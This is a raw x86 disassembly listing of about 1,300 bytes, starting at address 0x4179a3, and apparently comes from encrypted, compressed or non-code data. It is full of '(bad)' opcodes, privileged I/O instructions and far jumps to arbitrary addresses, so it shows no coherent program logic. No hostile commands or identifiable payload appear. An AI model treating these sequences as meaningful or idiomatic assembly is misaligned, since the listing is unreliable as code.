  4179a3:	jp     0x4179c2
  4179a5:	mov    dl,BYTE PTR [eax+0x60]
  4179a8:	fsub   DWORD PTR [ebx]
  4179aa:	arpl   di,dx
  4179ac:	retf   0x8b87
  4179af:	adc    DWORD PTR [edi],0xffffff91
  4179b2:	lods   al,BYTE PTR ds:[esi]
  4179b3:	mov    ds:0x5a0b9e60,al
  4179b8:	xor    ah,bh
  4179ba:	iret   
  4179bb:	lods   al,BYTE PTR ds:[esi]
  4179bc:	fild   DWORD PTR [edx]
  4179be:	mov    ds:0x6e800a37,al
  4179c3:	shl    DWORD PTR ds:0x7c47d471,0x31
  4179ca:	xor    BYTE PTR [edi+0x53],0x37
  4179ce:	adc    DWORD PTR [esi],ecx
  4179d0:	out    dx,eax
  4179d1:	mov    eax,ds:0xb7125103
  4179d6:	imul   ebx,DWORD PTR [edi+0x3d],0xb97d839f
  4179dd:	rol    BYTE PTR [ebx+ebx*4-0x2a4cfd71],cl
  4179e4:	sti    
  4179e5:	ins    DWORD PTR es:[edi],dx
  4179e6:	data16 sbb al,al
  4179e9:	pop    esi
  4179ea:	cmp    al,BYTE PTR [ebx+edi*2-0x29eabc9]
  4179f1:	jmp    0xccd6:0xc283a94f
  4179f8:	or     BYTE PTR [ebx+0x2d3e0b7a],al
  4179fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ff:	not    BYTE PTR [ebx+0x3d]
  417a02:	(bad)  
  417a03:	(bad)  
  417a05:	es pop edi
  417a07:	clc    
  417a08:	aas    
  417a09:	je     0x417a62
  417a0b:	mov    WORD PTR [ecx-0x467ef157],?
  417a11:	stos   DWORD PTR es:[edi],eax
  417a12:	push   edx
  417a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a14:	jb     0x4179e7
  417a16:	xor    DWORD PTR [edi+0x55],0x64c9c548
  417a1d:	aas    
  417a1e:	fsub   QWORD PTR [edi-0x46]
  417a21:	jmp    0x12c5258a
  417a26:	mov    DWORD PTR [ecx+0xe],edi
  417a29:	retf   0x5010
  417a2c:	ss pop ecx
  417a2e:	dec    ebx
  417a2f:	inc    ebx
  417a30:	dec    esi
  417a31:	aaa    
  417a32:	fs retf 
  417a34:	push   ds
  417a35:	sbb    DWORD PTR [ebp-0x47],ecx
  417a38:	pop    edi
  417a39:	inc    ebp
  417a3a:	push   esp
  417a3b:	clc    
  417a3c:	ficom  DWORD PTR [ebp-0x17]
  417a3f:	xor    BYTE PTR [ecx],dl
  417a41:	sbb    ch,ah
  417a43:	sbb    edx,ebx
  417a45:	cdq    
  417a46:	fadd   st,st(5)
  417a48:	hlt    
  417a49:	xchg   DWORD PTR [edx-0x4a049d56],ecx
  417a4f:	push   es
  417a50:	retf   0x873c
  417a53:	mov    BYTE PTR [ebx],dl
  417a55:	inc    eax
  417a56:	sbb    DWORD PTR [edi-0x3ad80d1],eax
  417a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a5d:	pop    edi
  417a5e:	(bad)  
  417a5f:	(bad)  
  417a60:	dec    ecx
  417a61:	push   edx
  417a62:	popa   
  417a63:	cmp    bh,cl
  417a65:	call   0xdac3eb71
  417a6a:	mov    eax,0xc9a0d4ee
  417a6f:	stos   DWORD PTR es:[edi],eax
  417a70:	adc    bh,BYTE PTR [eax+eiz*2-0x22]
  417a74:	lods   eax,DWORD PTR ds:[esi]
  417a75:	rcl    bl,1
  417a77:	(bad)  
  417a79:	cs xchg edx,eax
  417a7b:	les    esp,FWORD PTR [edi-0x32]
  417a7e:	leave  
  417a7f:	loop   0x417a4d
  417a81:	stc    
  417a82:	push   esp
  417a83:	repz dec esp
  417a85:	(bad)  
  417a86:	sar    DWORD PTR [edx],1
  417a88:	out    dx,eax
  417a89:	mov    ecx,DWORD PTR [esp+ebp*2]
  417a8c:	jnp    0x417b08
  417a8e:	lock pushf 
  417a90:	rol    DWORD PTR [edi+0x3a3ac155],0xbf
  417a97:	cdq    
  417a98:	xor    al,bh
  417a9a:	std    
  417a9b:	xchg   ecx,eax
  417a9c:	pop    edi
  417a9d:	mov    ecx,0x4631fb31
  417aa2:	inc    edx
  417aa3:	and    al,0xf5
  417aa5:	mov    bl,0xb5
  417aa7:	adc    ah,BYTE PTR ds:0xa7e74dff
  417aad:	sub    al,0x1c
  417aaf:	lea    ebx,[ecx-0x7d]
  417ab2:	and    al,0x4
  417ab4:	and    DWORD PTR [ebx-0xac62fe3],edi
  417aba:	pop    esi
  417abb:	pushw  cs
  417abd:	in     eax,0xc4
  417abf:	dec    ebp
  417ac0:	xchg   esp,eax
  417ac1:	ins    DWORD PTR es:[di],dx
  417ac3:	rcl    DWORD PTR [eax],0x5
  417ac6:	pop    ds
  417ac7:	lods   eax,DWORD PTR ds:[esi]
  417ac8:	icebp  
  417ac9:	retf   0xe60f
  417acc:	mov    ebx,0x6fd540c2
  417ad1:	jb     0x417a85
  417ad3:	rcl    DWORD PTR [edx-0x49],0x3
  417ad7:	aas    
  417ad8:	dec    ebx
  417ad9:	lds    esi,FWORD PTR [ebx-0x79]
  417adc:	outs   dx,BYTE PTR ds:[esi]
  417add:	mov    al,ds:0xa9b26996
  417ae2:	jae    0x417b55
  417ae4:	adc    bh,BYTE PTR cs:[eax]
  417ae7:	add    BYTE PTR [ebx+0x36365f81],dh
  417aed:	jmp    0x77cb:0x84f3c7c8
  417af4:	mov    al,ds:0xf3a70afc
  417af9:	retf   
  417afa:	push   eax
  417afb:	dec    edx
  417afc:	jo     0x417b39
  417afe:	outs   dx,DWORD PTR ds:[esi]
  417aff:	pop    edx
  417b00:	outs   dx,DWORD PTR ds:[esi]
  417b01:	sub    al,0x86
  417b04:	sbb    eax,0xaba61dab
  417b09:	xchg   ch,cl
  417b0b:	cmp    dh,ah
  417b0d:	pop    ss
  417b0e:	push   esi
  417b0f:	fisttp QWORD PTR [edi-0x505edc06]
  417b15:	stos   DWORD PTR es:[edi],eax
  417b16:	jmp    0xd3650f22
  417b1b:	push   cs
  417b1c:	test   DWORD PTR [ebx+0x1f],esi
  417b1f:	push   ebp
  417b20:	xchg   esp,eax
  417b21:	or     cl,dh
  417b23:	xchg   edx,eax
  417b24:	xchg   esp,eax
  417b25:	and    cl,BYTE PTR [esi+0x1dc12fdd]
  417b2b:	cld    
  417b2c:	out    0xe1,eax
  417b2e:	stc    
  417b2f:	inc    eax
  417b30:	int3   
  417b31:	retf   0xcc7b
  417b34:	out    0xe3,al
  417b36:	add    ebx,ecx
  417b38:	ins    BYTE PTR es:[edi],dx
  417b39:	stc    
  417b3a:	xchg   edi,eax
  417b3b:	and    DWORD PTR [edx-0x45b55812],0x11a01243
  417b45:	out    0x78,al
  417b47:	pop    ecx
  417b48:	scas   al,BYTE PTR es:[edi]
  417b49:	sbb    al,0x7d
  417b4b:	out    0xd9,al
  417b4d:	jns    0x417b60
  417b4f:	(bad)  
  417b50:	jge    0x417b6c
  417b52:	stc    
  417b53:	add    BYTE PTR [ecx+ebp*4],cl
  417b56:	stos   DWORD PTR es:[edi],eax
  417b57:	fsubp  st(1),st
  417b59:	mov    ch,BYTE PTR [ebx-0x22624c2b]
  417b5f:	pop    ebp
  417b60:	xchg   ebp,eax
  417b61:	and    BYTE PTR [esi-0x79],0x87
  417b65:	jae    0x417ba3
  417b67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b68:	add    eax,0x727a4e61
  417b6d:	jp     0x417b7c
  417b6f:	xor    esp,DWORD PTR ds:0x5752baa2
  417b75:	xchg   bh,bh
  417b77:	xor    BYTE PTR [ebp-0x5f9fb3f0],ah
  417b7d:	mov    ecx,0xdcfe285
  417b82:	push   es
  417b83:	scas   al,BYTE PTR es:[edi]
  417b84:	out    dx,eax
  417b85:	pop    edx
  417b86:	call   0x8c7:0x9e1914e4
  417b8d:	gs pop esp
  417b8f:	test   al,0x49
  417b91:	int3   
  417b92:	xchg   edx,eax
  417b93:	adc    al,0xdb
  417b95:	cdq    
  417b96:	dec    ebp
  417b97:	in     eax,dx
  417b98:	cmc    
  417b99:	fisubr DWORD PTR [ecx+0x2237736e]
  417b9f:	push   cs
  417ba0:	mov    al,0x6
  417ba2:	aaa    
  417ba3:	iret   
  417ba4:	push   edx
  417ba5:	imul   edx,DWORD PTR ds:0x637d2099,0xffffffb1
  417bac:	push   ebx
  417bad:	adc    BYTE PTR [esi-0xcf04798],0xba
  417bb4:	jmp    0x6e7b:0xd771d2c6
  417bbb:	outs   dx,DWORD PTR ds:[esi]
  417bbc:	adc    ah,BYTE PTR [ebx-0x18]
  417bbf:	cdq    
  417bc0:	mov    ds,WORD PTR [eax-0x4bf8ed96]
  417bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bc7:	cli    
  417bc8:	outs   dx,BYTE PTR ds:[esi]
  417bc9:	in     al,0x70
  417bcb:	sub    DWORD PTR [edi+0x573efc12],edx
  417bd1:	push   ss
  417bd2:	and    ebp,ebp
  417bd4:	dec    ecx
  417bd5:	jmp    0x417bce
  417bd7:	cwde   
  417bd8:	loop   0x417c2a
  417bda:	loopne 0x417b8d
  417bdc:	push   ebp
  417bdd:	push   ebp
  417bde:	bswap  esi
  417be0:	ret    0x9472
  417be3:	call   0x2bd9:0x7fe584f1
  417bea:	adc    al,0xbe
  417bec:	test   al,0x84
  417bee:	xchg   ebp,eax
  417bef:	into   
  417bf0:	popa   
  417bf1:	jmp    0x5e62ab09
  417bf6:	std    
  417bf7:	mov    esp,eax
  417bf9:	inc    ebp
  417bfa:	push   0x3a
  417bfc:	(bad)  
  417bfe:	inc    ebx
  417bff:	mov    ebp,0x28509c47
  417c04:	inc    esi
  417c05:	inc    ecx
  417c06:	xor    al,0xeb
  417c08:	ja     0x417b8e
  417c0a:	pushf  
  417c0b:	cmp    DWORD PTR [edi],0x61
  417c0e:	xchg   esp,eax
  417c0f:	enter  0x893,0xdb
  417c13:	test   DWORD PTR [edx],edx
  417c15:	sbb    ebp,DWORD PTR [eax+0x2aac171e]
  417c1b:	sahf   
  417c1c:	outs   dx,DWORD PTR ds:[esi]
  417c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c1e:	fst    DWORD PTR [esp+edi*8-0x29e91c8e]
  417c25:	pop    ecx
  417c26:	mov    eax,0xb25faa61
  417c2b:	stos   BYTE PTR es:[edi],al
  417c2c:	and    esi,DWORD PTR [esi]
  417c2e:	push   es
  417c2f:	push   ss
  417c30:	push   ecx
  417c31:	fcomip st,st(0)
  417c33:	pop    eax
  417c34:	jmp    0x417bef
  417c36:	data16 ror ch,1
  417c39:	mov    DWORD PTR [edi],edi
  417c3b:	pop    ds
  417c3c:	pop    esi
  417c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c3e:	or     bl,BYTE PTR [edi+edi*1-0x18f83a50]
  417c45:	int    0x4d
  417c47:	(bad)  ds:0x215e1ec4
  417c4d:	ins    BYTE PTR es:[edi],dx
  417c4e:	outs   dx,BYTE PTR ds:[esi]
  417c4f:	mov    esp,0x62324832
  417c54:	pop    edx
  417c55:	leave  
  417c56:	push   ds
  417c57:	add    eax,0x5ac005aa
  417c5c:	pop    ebx
  417c5d:	mov    edx,0xc5d830eb
  417c62:	or     edi,DWORD PTR [esp+ebx*4]
  417c65:	jg     0x417c3c
  417c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c68:	xchg   esp,eax
  417c69:	rcr    ebx,0x2
  417c6c:	les    edx,FWORD PTR [eax+0x3e9e45c]
  417c72:	pop    ebx
  417c73:	jl     0x417c38
  417c75:	stos   DWORD PTR es:[edi],eax
  417c76:	scas   al,BYTE PTR es:[edi]
  417c77:	scas   eax,DWORD PTR es:[edi]
  417c78:	dec    ecx
  417c79:	(bad)  
  417c7a:	mov    ah,0xdd
  417c7c:	pop    ss
  417c7d:	mov    dl,BYTE PTR [edi-0x10]
  417c80:	mov    WORD PTR [ebx*1-0x69994c16],ds
  417c87:	and    DWORD PTR [esi+0x3e],esi
  417c8a:	lahf   
  417c8b:	loope  0x417ca9
  417c8d:	mov    ah,0x63
  417c8f:	in     eax,0x38
  417c91:	push   eax
  417c92:	adc    eax,0xac308b6a
  417c97:	mov    al,0x2d
  417c99:	fiadd  DWORD PTR ds:0x114071fe
  417c9f:	inc    ebp
  417ca0:	sbb    al,0x78
  417ca2:	mov    bh,0x55
  417ca4:	cmp    cl,BYTE PTR ds:0xb2a33ff5
  417caa:	cli    
  417cab:	(bad)  
  417cac:	pushf  
  417cad:	xchg   edx,eax
  417cae:	mov    cl,0xae
  417cb0:	jb     0x417cd9
  417cb2:	ficomp DWORD PTR [eax+0x35]
  417cb5:	inc    esi
  417cb6:	jle    0x417c5a
  417cb8:	dec    ebx
  417cb9:	lods   eax,DWORD PTR ds:[esi]
  417cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cbb:	mov    ds:0xc140a9fc,eax
  417cc0:	sub    ah,BYTE PTR [ebp+0x28]
  417cc3:	bound  esp,QWORD PTR ss:[ebp-0x75]
  417cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cc8:	sti    
  417cc9:	aas    
  417cca:	cmp    eax,ebp
  417ccc:	ins    DWORD PTR es:[edi],dx
  417ccd:	aam    0xe0
  417ccf:	loope  0x417c88
  417cd1:	jle    0x417d09
  417cd3:	add    DWORD PTR [ebx*8-0x74b54d19],edx
  417cda:	mov    esi,0x17d35bb
  417cdf:	jg     0x417cfe
  417ce1:	mov    esi,0x42f9cd4f
  417ce6:	or     cl,dh
  417ce8:	dec    edi
  417ce9:	adc    eax,0xeff93da7
  417cee:	ins    BYTE PTR es:[edi],dx
  417cef:	dec    esp
  417cf0:	in     eax,0xf0
  417cf2:	push   ebp
  417cf3:	pop    edi
  417cf4:	xor    BYTE PTR [ebx],dh
  417cf6:	lea    eax,[ebp+0x18f669dd]
  417cfc:	pop    es
  417cfd:	test   bh,bh
  417cff:	xor    al,0x41
  417d01:	xor    DWORD PTR [esi+0x255fbd4b],edi
  417d07:	and    bl,BYTE PTR [edi-0x2f]
  417d0a:	jne    0x417d3b
  417d0c:	shl    DWORD PTR [ecx],cl
  417d0e:	aam    0x66
  417d10:	dec    edi
  417d11:	idiv   BYTE PTR [eax]
  417d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d14:	sti    
  417d15:	cmc    
  417d16:	imul   ebx,esi,0xc8f7af89
  417d1c:	and    bh,BYTE PTR [ecx+0x68d52e9e]
  417d22:	push   cs
  417d23:	push   0x2e95866b
  417d28:	mov    ah,0xb4
  417d2a:	cmc    
  417d2b:	pop    edx
  417d2c:	int3   
  417d2d:	adc    DWORD PTR [esi-0x57f6a1b4],ebp
  417d33:	dec    edx
  417d34:	jno    0x417cfa
  417d36:	and    eax,0x91270177
  417d3b:	(bad)  
  417d3c:	scas   al,BYTE PTR es:[edi]
  417d3d:	inc    ecx
  417d3e:	ss je  0x417cca
  417d41:	out    0x59,eax
  417d43:	(bad)  
  417d44:	sub    eax,0xc31ad46c
  417d49:	inc    ebp
  417d4a:	pop    ecx
  417d4b:	push   0x17f206ff
  417d50:	add    ebx,DWORD PTR [ebx+0x1ff319d8]
  417d56:	dec    edi
  417d57:	iret   
  417d58:	nop
  417d59:	data16 fsub QWORD PTR [edi-0x162753b8]
  417d60:	cmp    DWORD PTR [ebp-0x49],ebx
  417d63:	mov    bl,0x9b
  417d65:	mov    edi,0xcc740407
  417d6a:	push   ds
  417d6b:	mov    edi,0x61285d10
  417d70:	(bad)  
  417d71:	addr16 mov al,ds:0x46cd
  417d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d76:	sbb    esp,ebp
  417d78:	test   eax,0x57859285
  417d7d:	inc    ecx
  417d7e:	lods   al,BYTE PTR ds:[esi]
  417d7f:	jp     0x417d66
  417d81:	xchg   esi,eax
  417d82:	out    0x22,al
  417d84:	and    ah,BYTE PTR ds:0xb8ff5af6
  417d8a:	rol    BYTE PTR [edi],1
  417d8c:	jmp    0x417d75
  417d8e:	into   
  417d8f:	add    esi,DWORD PTR [ebp-0x3c]
  417d92:	jmp    0x417db8
  417d94:	inc    eax
  417d95:	fistp  WORD PTR [ebp+0x1e]
  417d98:	inc    ebp
  417d99:	mov    esi,0x5e3e4b86
  417d9e:	sub    al,0xf9
  417da0:	jne    0x417dbe
  417da2:	inc    edi
  417da3:	push   0x40bdb2c9
  417da8:	jae    0x417d66
  417daa:	fwait
  417dab:	jnp    0x417db9
  417dad:	(bad)  
  417daf:	push   ecx
  417db0:	mov    ecx,0x381917dd
  417db5:	dec    esi
  417db6:	mov    BYTE PTR [ebp+0xb],ah
  417db9:	mov    BYTE PTR [ebx],cl
  417dbb:	or     bh,ah
  417dbd:	lock mov eax,0x53d76e96
  417dc3:	outs   dx,BYTE PTR ds:[esi]
  417dc4:	sahf   
  417dc5:	mov    al,ds:0x47f397cd
  417dca:	mov    ds:0x4d19d3b6,eax
  417dcf:	in     al,dx
  417dd0:	push   edi
  417dd1:	jo     0x417e0c
  417dd3:	rol    bl,1
  417dd5:	shl    BYTE PTR [esi-0x6],0x10
  417dd9:	aaa    
  417dda:	mov    eax,ds:0x97871162
  417ddf:	aas    
  417de0:	and    ecx,DWORD PTR [edi-0x176d130]
  417de6:	jb     0x417d81
  417de8:	dec    eax
  417de9:	or     edi,DWORD PTR es:[ebp-0x1]
  417ded:	sub    BYTE PTR [eax-0x44],ah
  417df0:	mov    eax,ds:0x61a26f66
  417df5:	xchg   ecx,eax
  417df6:	test   esi,esp
  417df8:	xor    edx,ebx
  417dfa:	ret    0x33a5
  417dfd:	push   ecx
  417dfe:	inc    esi
  417dff:	test   eax,0xcbb751b0
  417e04:	ret    
  417e05:	in     al,0x34
  417e07:	mov    ds:0xb1996c7f,eax
  417e0c:	inc    ebx
  417e0d:	sysexit 
  417e0f:	jno    0x417e28
  417e11:	scas   eax,DWORD PTR es:[edi]
  417e12:	dec    edx
  417e13:	out    0xfe,eax
  417e15:	lods   al,BYTE PTR ds:[esi]
  417e16:	leave  
  417e17:	dec    esp
  417e18:	daa    
  417e19:	xor    ecx,ebx
  417e1b:	mov    eax,0x71c5d266
  417e20:	mov    WORD PTR [esi+0x75e83e6b],ds
  417e26:	ja     0x417e2d
  417e28:	jo     0x417dd9
  417e2a:	mov    dl,0x46
  417e2c:	aam    0x99
  417e2e:	idiv   DWORD PTR [ecx+0x7a6b23d]
  417e34:	mov    ch,BYTE PTR [esi+0x40b2b97f]
  417e3a:	mov    bl,0x71
  417e3c:	mov    dh,0xa4
  417e3e:	sub    eax,0xc73995c1
  417e43:	repnz test ebp,esp
  417e46:	daa    
  417e47:	mov    ebx,0x58db289a
  417e4c:	sbb    DWORD PTR [eax+0xd],0x569916d0
  417e53:	add    DWORD PTR [esi],esi
  417e55:	inc    eax
  417e56:	imul   edi,DWORD PTR [esi-0x6775e57f],0x51c228d5
  417e60:	inc    esp
  417e61:	mov    WORD PTR [ebp-0x35],?
  417e64:	inc    esp
  417e65:	mov    ecx,0x826a4042
  417e6a:	pop    eax
  417e6b:	jno    0x417e83
  417e6d:	lods   al,BYTE PTR ds:[esi]
  417e6e:	jb     0x417e5d
  417e70:	jge    0x417e8d
  417e72:	jno    0x417e8e
  417e74:	dec    eax
  417e75:	dec    esi
  417e76:	inc    edx
  417e77:	gs out 0x3f,eax
  417e7a:	aaa    
  417e7b:	push   esp
  417e7c:	mov    WORD PTR [edx],?
  417e7e:	push   eax
  417e7f:	aaa    
  417e80:	jno    0x417e1c
  417e82:	mov    dh,0x86
  417e84:	cmp    eax,0x96ca671e
  417e89:	in     al,dx
  417e8a:	mov    dl,0x64
  417e8c:	not    dl
  417e8e:	out    dx,al
  417e8f:	push   ecx
  417e90:	mov    al,0xc4
  417e92:	stos   BYTE PTR es:[edi],al
  417e93:	fnstsw WORD PTR fs:[edi]
  417e96:	imul   esp,ecx,0x40
  417e99:	lahf   
  417e9a:	cdq    
  417e9b:	sbb    eax,0x48ae9dc4
  417ea0:	inc    esi
  417ea1:	and    al,0xe1
  417ea3:	add    eax,0x473c46ba
  417ea8:	or     eax,0x39972b4a
  417ead:	jb     0x417e6f
  417eaf:	xor    cl,dl
  417eb1:	cmc    
  417eb2:	es inc eax
  417eb4:	pop    esp
  417eb5:	fst    QWORD PTR [edi+0x4d7617ae]
  417ebb:	fstp   TBYTE PTR [eax]
  417ebd:	xchg   esp,eax
  417ebe:	push   esp
  417ebf:	stos   BYTE PTR es:[edi],al
  417ec0:	loope  0x417e4f
  417ec2:	imul   eax,DWORD PTR [eax],0x9bbdc6ee
  417ec8:	sub    esi,ebp
  417eca:	xchg   esi,eax
  417ecb:	out    dx,eax
  417ecc:	out    0xf1,al
  417ece:	sub    al,0xc6
  417ed0:	xchg   ecx,eax
  417ed1:	retf   
  417ed2:	pop    ebx
  417ed3:	pushf  
  417ed4:	jo     0x417ed7
  417ed6:	jbe    0x417ec0
  417ed8:	pop    es
  417ed9:	and    ebx,DWORD PTR [ebp-0x93e3b66]
  417edf:	leave  
  417ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ee1:	mov    ecx,esp
  417ee3:	outs   dx,DWORD PTR ds:[esi]
  417ee4:	xchg   DWORD PTR [ebp-0x71],eax
  417ee7:	dec    BYTE PTR [edx-0x4c]
  417eea:	out    0x41,eax
  417eec:	popa   
  417eed:	out    dx,eax
  417eee:	mov    dh,0x25
  417ef0:	aam    0xac
  417ef2:	cmp    bh,BYTE PTR [edi-0x28]
  417ef5:	aas    
  417ef6:	pusha  
  417ef7:	and    eax,0xffffff9f
  417efa:	fmul   QWORD PTR [eax+edx*4-0x7c1e8e8e]
  417f01:	mov    cl,0xbe
  417f03:	mov    esp,0xb9079bd5
  417f08:	push   0x2a
  417f0a:	xchg   DWORD PTR [ebx-0x68],edx
  417f0d:	add    bl,BYTE PTR ds:0x6bbb800b
  417f13:	add    cl,BYTE PTR [eax+ebx*1]
  417f16:	mov    al,BYTE PTR [eax]
  417f18:	outs   dx,BYTE PTR ds:[esi]
  417f19:	dec    ebx
  417f1a:	ret    
  417f1b:	pop    ecx
  417f1c:	adc    al,0x1
  417f1e:	dec    edx
  417f1f:	mov    ch,0x36
  417f21:	push   ecx
  417f22:	(bad)  [ebp+0x5b]
  417f25:	inc    edx
  417f26:	xor    al,0xb1
  417f28:	fild   DWORD PTR [ebx-0x2f]
  417f2b:	xchg   BYTE PTR [eiz*4-0x1a9fae73],bl
  417f32:	fistp  DWORD PTR [edx+0x0]
  417f35:	dec    edi
  417f36:	cwde   
  417f37:	outs   dx,BYTE PTR ds:[esi]
  417f38:	adc    DWORD PTR [ebp-0x28cd5f4a],esp
  417f3e:	arpl   WORD PTR [edx],cx
  417f40:	fidiv  DWORD PTR ds:0x43835024
  417f46:	mov    bl,0x1
  417f48:	imul   edx,DWORD PTR [esi+0x6c778224],0xffffffd5
  417f4f:	retf   
  417f50:	pop    esp
  417f51:	repnz cdq 
  417f53:	push   ebx
  417f54:	sub    BYTE PTR [ecx-0x66e01ed4],0x81
  417f5b:	mov    esi,0x2e9fe02
  417f60:	and    BYTE PTR [edx],bh
  417f62:	sti    
  417f63:	pop    es
  417f64:	push   edx
  417f65:	int3   
  417f66:	in     eax,0xd4
  417f68:	and    dl,BYTE PTR [eax]
  417f6a:	inc    edi
  417f6b:	repnz lahf 
  417f6d:	xor    DWORD PTR [ebp+eax*1+0x6d],0xffffffe6
  417f72:	push   ss
  417f73:	inc    edx
  417f74:	popf   
  417f75:	push   edx
  417f76:	(bad)  
  417f77:	jns    0x417f73
  417f79:	or     BYTE PTR ss:[edi],ch
  417f7c:	mov    esi,0x49d68e2e
  417f81:	aam    0xbb
  417f83:	push   0xffffff8c
  417f85:	and    eax,DWORD PTR [esi+ebx*4-0x47443615]
  417f8c:	mov    esi,esp
  417f8e:	pop    edi
  417f8f:	std    
  417f90:	pushf  
  417f91:	jmp    0x417f44
  417f93:	xchg   ebx,eax
  417f94:	sbb    BYTE PTR [ebx-0x6d84acd8],cl
  417f9a:	stos   WORD PTR es:[edi],ax
  417f9c:	add    ecx,DWORD PTR gs:[edx+ebp*1-0x64667ecb]
  417fa4:	loopne 0x418005
  417fa6:	cld    
  417fa7:	and    dh,BYTE PTR [ebp+0x55]
  417faa:	add    dl,BYTE PTR [ebp+0x4]
  417fad:	ror    DWORD PTR [edi-0x376511bb],cl
  417fb3:	push   es
  417fb4:	mov    ah,0x1e
  417fb6:	xchg   esi,eax
  417fb7:	cmp    ah,al
  417fb9:	and    dh,al
  417fbb:	mov    eax,0x56158008
  417fc0:	lods   al,BYTE PTR ds:[esi]
  417fc1:	sbb    DWORD PTR [ebp-0x7c255f61],ecx
  417fc7:	jbe    0x417fe5
  417fc9:	fisub  WORD PTR [ecx+0x675b6d4e]
  417fcf:	jns    0x417fe0
  417fd1:	jmp    0x17c074bb
  417fd6:	aam    0x6f
  417fd8:	mov    al,BYTE PTR [edi-0x6390e888]
  417fde:	adc    al,BYTE PTR [edi-0x3140d7c7]
  417fe4:	(bad)  
  417fe5:	mov    cl,0x8
  417fe7:	add    esp,0xffffffed
  417fea:	(bad)  
  417feb:	xor    DWORD PTR es:[ebx-0x5],0x66
  417ff0:	dec    edi
  417ff1:	xor    ecx,DWORD PTR [edi]
  417ff3:	sahf   
  417ff4:	stos   DWORD PTR es:[edi],eax
  417ff5:	cs stos DWORD PTR es:[edi],eax
  417ff7:	call   0x504a:0x669c05ac
  417ffe:	test   al,0x52
  418000:	fistp  WORD PTR [eax]
  418002:	mov    ebp,0xae86dab0
  418007:	arpl   WORD PTR [ecx+ebp*2],bx
  41800a:	mov    ebp,0x9f177e98
  41800f:	mov    DWORD PTR [edx+0x43d829],ecx
  418015:	cmp    eax,edx
  418017:	mov    eax,ds:0x9e698824
  41801c:	cmp    eax,0x38a51aaf
  418021:	idiv   DWORD PTR [eax]
  418023:	mov    dh,0xe9
  418025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418026:	fs sar cl,0x38
  41802a:	test   BYTE PTR [ebx-0x55],bh
  41802d:	inc    ecx
  41802e:	lahf   
  41802f:	xor    edi,esi
  418031:	les    ecx,FWORD PTR [edx-0xb]
  418034:	xchg   edx,eax
  418035:	pop    esp
  418036:	push   ss
  418037:	jbe    0x417fbd
  418039:	sbb    BYTE PTR [esi-0x580e0de1],bh
  41803f:	mov    bh,0x7a
  418041:	sub    al,BYTE PTR [edx+0x78]
  418044:	dec    esi
  418045:	pop    esp
  418046:	mov    edi,0xedee6c59
  41804b:	test   al,0x28
  41804d:	xchg   ecx,eax
  41804e:	or     ah,BYTE PTR [ebx]
  418050:	das    
  418051:	imul   ebp,DWORD PTR ds:0x71554b52,0xffffff8e
  418058:	arpl   WORD PTR [ecx],bx
  41805a:	and    BYTE PTR [esi-0x49a25476],dl
  418060:	or     BYTE PTR [eax+ebx*2+0x53],al
  418064:	cmp    eax,0xf0ed58d4
  418069:	pop    ds
  41806a:	sbb    BYTE PTR [edi],dh
  41806c:	int    0xb6
  41806e:	enter  0xee15,0x34
  418072:	cmp    al,0xee
  418074:	(bad)  
  418075:	sbb    al,0xd4
  418077:	clc    
  418078:	and    dl,BYTE PTR [eax+eax*2]
  41807b:	sub    esp,DWORD PTR [ebx+0x490feda8]
  418081:	sub    BYTE PTR [esi-0x5d2b0f10],ah
  418087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418088:	pop    ebp
  418089:	push   0xcf479b28
  41808e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41808f:	retf   
  418090:	and    dh,BYTE PTR cs:[ebx]
  418093:	jne    0x418110
  418095:	dec    ebx
  418096:	add    esi,DWORD PTR [edx+0x6d33910a]
  41809c:	fild   WORD PTR [esi-0x69]
  41809f:	xchg   edi,ebp
  4180a1:	fs in  al,0xc8
  4180a4:	ret    
  4180a5:	lea    edx,[edi]
  4180a7:	or     eax,0xc647ac1d
  4180ac:	outs   dx,BYTE PTR ds:[esi]
  4180ad:	push   eax
  4180ae:	xor    DWORD PTR [edi+0xc],ebp
  4180b1:	fnsave [esi-0x1aee5d8c]
  4180b7:	push   esi
  4180b8:	and    bl,BYTE PTR [ecx]
  4180ba:	push   edi
  4180bb:	imul   edi,esp,0x6e
  4180be:	adc    BYTE PTR [ecx+edi*2-0x34252de0],cl
  4180c5:	sbb    al,0x14
  4180c7:	mov    esi,0x1785a0e3
  4180cc:	cmp    BYTE PTR [ecx],cl
  4180ce:	pushf  
  4180cf:	call   0x6445a3bd
  4180d4:	adc    BYTE PTR [edi-0x23],0x2f
  4180d8:	xor    ch,BYTE PTR [esp+edi*2-0x59f22ff5]
  4180df:	outs   dx,DWORD PTR ds:[esi]
  4180e0:	jg     0x418150
  4180e2:	jae    0x418065
  4180e4:	retf   0x905d
  4180e7:	repz cld 
  4180e9:	mov    ds:0x3796b3db,al
  4180ee:	in     al,dx
  4180ef:	add    eax,0x8c14de96
  4180f4:	xchg   ebp,eax
  4180f5:	adc    al,0x68
  4180f7:	xchg   ebp,eax
  4180f8:	and    eax,0x71bd421
  4180fd:	scas   al,BYTE PTR es:[edi]
  4180fe:	mov    dl,BYTE PTR [ebp+eiz*4-0x18]
  418102:	adc    bh,BYTE PTR [edi-0x5a714a67]
  418108:	div    BYTE PTR [esi-0xc9b6cd]
  41810e:	adc    DWORD PTR [ebx],esp
  418110:	adc    eax,0xc3a6a118
  418115:	mov    esp,0x5ee59a0b
  41811a:	sbb    eax,0xae65dada
  41811f:	ja     0x41812d
  418121:	or     ch,dl
  418123:	push   eax
  418124:	adc    al,0x94
  418126:	sub    dl,cl
  418128:	test   eax,0xfd79bf2
  41812d:	push   edi
